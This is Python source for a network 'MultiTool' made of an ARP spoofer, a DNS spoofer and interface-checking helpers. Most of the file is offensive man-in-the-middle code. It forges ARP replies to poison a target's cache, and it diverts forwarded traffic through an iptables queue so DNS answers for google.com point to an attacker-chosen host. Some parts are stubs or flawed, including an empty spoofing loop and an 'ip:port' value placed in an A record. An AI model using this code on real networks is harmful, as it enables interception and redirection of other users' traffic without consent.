"""
@MultiTool / NetworkSniffer
@Version 1.0
@Python 3.10.12
"""
import psutil,os,socket,ipaddress,sys
from scapy.all import (IP,DNSRR,DNSQR,UDP,DNS,ARP,Ether,srp,send)
from netfilterqueue import NetfilterQueue
#
from src.modules.logger import (LOGGER,Fore)
#

class ARPSpoofer(LOGGER):
    def __init__(self,timezone:str) -> None:
        self.timezone = timezone
        super().__init__()
        self.SPOOFING_STATUS:bool = False
    
    def get_mac(self,ip_addr:str):
        arp_request = ARP(pdst = ip_addr)
        broadcast = Ether(dst ="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = srp(arp_request_broadcast, timeout = 5, verbose = False)[0]
        return answered_list[0][1].hwsrc

    def spoof(self,target_ip:str,spoof_ip:str):
        try:
            # Sending ARP-Packet to TARGET-IP
            packet = ARP(op=2, pdst=target_ip, 
                hwdst=self.get_mac(target_ip), psrc=spoof_ip)
            send(packet, verbose=False)
        except Exception as _error:
            self.error(f"An error occured while trying to ARP-Spoof: {str(_error)}")
            
    def restore(self,destination_ip:str,source_ip:str):
        try:
            destination_mac = self.get_mac(destination_ip)
            source_mac = self.get_mac(source_ip)
            packet = ARP(op=2, pdst=destination_ip, 
                hwdst=destination_mac, 
                psrc=source_ip, hwsrc = source_mac)
            send(packet, verbose=False)
        except Exception as _error:
            self.error(f"An error occured while trying to restore ARP-Spoofing: {str(_error)}")
            
    def start_spoofing(self,target_ip:str,gateway_ip:str) -> None:
        while self.SPOOFING_STATUS:
            pass
        sys.exit()

class DNSSpoofer(LOGGER):
    def __init__(self,timezone:str,host_ip:str,host_port:int) -> None:
        self.timezone:str = timezone
        super().__init__()
        self.hostDict:dict =  {
            b'google.com.': f"{host_ip}:{host_port}"
        }
        self.queueNum:int = 1
        self.queue = NetfilterQueue()
        self.SPOOFING_STATUS:bool = False
    
    def start_spoofing(self) -> None:
        try:
            os.system(
                f'iptables -I FORWARD -j NFQUEUE --queue-num {self.queueNum}')
            self.queue.bind(self.queueNum, self.callBack)
            try:
                self.queue.run()
            except KeyboardInterrupt:
                self.warning("Detected Keyboard-Interruption")
            os.system(f'iptables -D FORWARD -j NFQUEUE --queue-num {self.queueNum}')
        except Exception as _error:
            self.error(f"An erroc occured while trying to DNS-Spoof: {str(_error)}")
        sys.exit()
            
    
    def callBack(self, packet):
        scapyPacket = IP(packet.get_payload())
        if scapyPacket.haslayer(DNSRR):
            try:
                self.info(f'[original] { scapyPacket[DNSRR].summary()}')
                queryName = scapyPacket[DNSQR].qname
                if queryName in self.hostDict:
                    scapyPacket[DNS].an = DNSRR(
                        rrname=queryName, rdata=self.hostDict[queryName])
                    scapyPacket[DNS].ancount = 1
                    del scapyPacket[IP].len
                    del scapyPacket[IP].chksum
                    del scapyPacket[UDP].len
                    del scapyPacket[UDP].chksum
                    self.info(f'[modified] {scapyPacket[DNSRR].summary()}')
                else:
                    self.info(f'[not modified] { scapyPacket[DNSRR].rdata }')
            except IndexError as error:
                self.error(f"An error occured while CallBack: {str(error)}")
            packet.set_payload(bytes(scapyPacket))
        return packet.accept()
        

class NETWORK_TOOL(LOGGER):
    def __init__(self,timezone:str) -> None:
        self.timezone = timezone
        super().__init__()
        
    def check_iface(self,iface:str) -> bool:
        network_interfaces = psutil.net_if_addrs()
        for interface, addresses in network_interfaces.items():
            if interface == iface:
                return True
        return False
    
    def get_network_prefix(self) -> str:
        network_prefix:str = ""
        try:
            ip_list = socket.gethostbyname_ex(socket.gethostname())[2]
            for ip in ip_list:
                try:
                    ip_obj = ipaddress.ip_address(ip)
                    if ip_obj.version == 4:
                        network_prefix = str(ipaddress.IPv4Network(ip, strict=False).network_address).split(".")
                        break
                except ValueError as e:
                    pass
        except Exception as _error:
            pass
        return network_prefix
    
    def check_ip_addr(self,ip_addr:str) -> bool:
        try:
            ipaddress.ip_address(ip_addr)
            return True
        except ValueError:
            return False
    
    def scan(self) -> None:
        iface:str = input(Fore.YELLOW+"Enter the interface"+Fore.WHITE+"> "+Fore.RESET)
        if self.check_iface(iface):
            pass
        else:
            self.error(f"The interface '{iface}' is invalid!")